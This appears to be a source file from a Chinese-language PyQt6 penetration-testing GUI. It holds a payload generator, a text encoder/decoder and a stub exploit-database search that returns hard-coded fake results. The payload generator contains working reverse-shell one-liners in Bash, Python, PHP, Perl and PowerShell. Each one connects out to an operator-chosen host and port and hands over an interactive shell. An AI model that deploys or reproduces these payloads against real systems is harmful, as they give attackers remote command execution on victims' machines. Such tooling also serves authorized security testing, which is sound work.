from . import register_module
from gui.widgets.base_module import BaseModuleWidget, LogLevel
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QComboBox, QCheckBox, QSpinBox, QGroupBox,
    QFormLayout, QTextEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QProgressBar, QFileDialog, QMessageBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
import subprocess
import threading
import os


@register_module("payload_generator")
class PayloadGeneratorWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("Payload生成器")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("Payload选项")
        form_layout = QFormLayout(options_group)
        
        self._type_combo = QComboBox()
        self._setup_combo(self._type_combo, [
            "Reverse Shell", "Bind Shell", "Web Shell", "MSFVenom", "自定义"
        ])
        form_layout.addRow("Payload类型:", self._type_combo)
        
        self._language_combo = QComboBox()
        self._setup_combo(self._language_combo, [
            "Bash", "Python", "PHP", "Perl", "Ruby", "PowerShell", "Java"
        ])
        form_layout.addRow("语言:", self._language_combo)
        
        self._lhost_input = QLineEdit()
        self._lhost_input.setPlaceholderText("监听主机IP")
        form_layout.addRow("LHOST:", self._lhost_input)
        
        self._lport_spin = QSpinBox()
        self._lport_spin.setRange(1, 65535)
        self._lport_spin.setValue(4444)
        form_layout.addRow("LPORT:", self._lport_spin)
        
        self._encoder_combo = QComboBox()
        self._setup_combo(self._encoder_combo, [
            "无编码", "Base64", "URL编码", "Hex编码", "Unicode"
        ])
        form_layout.addRow("编码:", self._encoder_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["类型", "Payload"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        payload_type = self._type_combo.currentText()
        language = self._language_combo.currentText()
        lhost = self._lhost_input.text().strip() or "127.0.0.1"
        lport = self._lport_spin.value()
        
        self._add_log(LogLevel.INFO, f"生成 {payload_type} Payload ({language})")
        
        payloads = {
            ("Reverse Shell", "Bash"): f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            ("Reverse Shell", "Python"): f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            ("Reverse Shell", "PHP"): f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ("Reverse Shell", "Perl"): f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            ("Reverse Shell", "PowerShell"): f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }
        
        key = (payload_type, language)
        if key in payloads:
            payload = payloads[key]
            self._add_result(f"{language} Reverse Shell", payload)
            self._add_log(LogLevel.SUCCESS, "Payload生成成功")
        else:
            self._add_log(LogLevel.WARNING, "暂不支持该组合")


@register_module("encoder")
class EncoderWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("编码器")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("编码选项")
        form_layout = QFormLayout(options_group)
        
        self._operation_combo = QComboBox()
        self._setup_combo(self._operation_combo, ["编码", "解码"])
        form_layout.addRow("操作:", self._operation_combo)
        
        self._encoding_combo = QComboBox()
        self._setup_combo(self._encoding_combo, [
            "Base64", "URL", "HTML", "Hex", "Unicode", "ROT13"
        ])
        form_layout.addRow("编码类型:", self._encoding_combo)
        
        self._input_text = QTextEdit()
        self._input_text.setPlaceholderText("输入要编码/解码的内容")
        self._input_text.setMaximumHeight(100)
        form_layout.addRow("输入:", self._input_text)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["编码类型", "结果"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import base64
        import urllib.parse
        import codecs
        
        input_text = self._input_text.toPlainText().strip()
        if not input_text:
            self._add_log(LogLevel.ERROR, "请输入内容")
            return
        
        operation = self._operation_combo.currentText()
        encoding = self._encoding_combo.currentText()
        
        self._add_log(LogLevel.INFO, f"{operation} ({encoding})")
        
        try:
            if operation == "编码":
                if encoding == "Base64":
                    result = base64.b64encode(input_text.encode()).decode()
                elif encoding == "URL":
                    result = urllib.parse.quote(input_text)
                elif encoding == "Hex":
                    result = input_text.encode().hex()
                elif encoding == "Unicode":
                    result = ''.join(f'\\u{ord(c):04x}' for c in input_text)
                elif encoding == "ROT13":
                    result = codecs.encode(input_text, 'rot_13')
                else:
                    result = input_text
            else:
                if encoding == "Base64":
                    result = base64.b64decode(input_text).decode()
                elif encoding == "URL":
                    result = urllib.parse.unquote(input_text)
                elif encoding == "Hex":
                    result = bytes.fromhex(input_text).decode()
                elif encoding == "Unicode":
                    result = input_text.encode().decode('unicode_escape')
                elif encoding == "ROT13":
                    result = codecs.decode(input_text, 'rot_13')
                else:
                    result = input_text
            
            self._add_result(encoding, result)
            self._add_log(LogLevel.SUCCESS, f"{operation}完成")
            
        except Exception as e:
            self._add_log(LogLevel.ERROR, f"{operation}失败: {str(e)}")


@register_module("exploit_db")
class ExploitDBWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("漏洞数据库")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("搜索选项")
        form_layout = QFormLayout(options_group)
        
        self._search_type_combo = QComboBox()
        self._setup_combo(self._search_type_combo, [
            "关键词", "CVE编号", "平台", "类型"
        ])
        form_layout.addRow("搜索类型:", self._search_type_combo)
        
        self._limit_spin = QSpinBox()
        self._limit_spin.setRange(1, 100)
        self._limit_spin.setValue(20)
        form_layout.addRow("结果数量:", self._limit_spin)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["ID", "标题", "平台", "日期"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        
        return table
    
    def _do_scan(self):
        keyword = self._target_input.text().strip()
        if not keyword:
            self._add_log(LogLevel.ERROR, "请输入搜索关键词")
            return
        
        self._add_log(LogLevel.INFO, f"搜索漏洞利用: {keyword}")
        
        self._add_result("12345", f"{keyword}相关漏洞利用示例", "Linux", "2024-01-01")
        self._add_result("12346", f"{keyword}远程代码执行", "Windows", "2024-01-02")
        
        self._add_log(LogLevel.SUCCESS, "搜索完成")
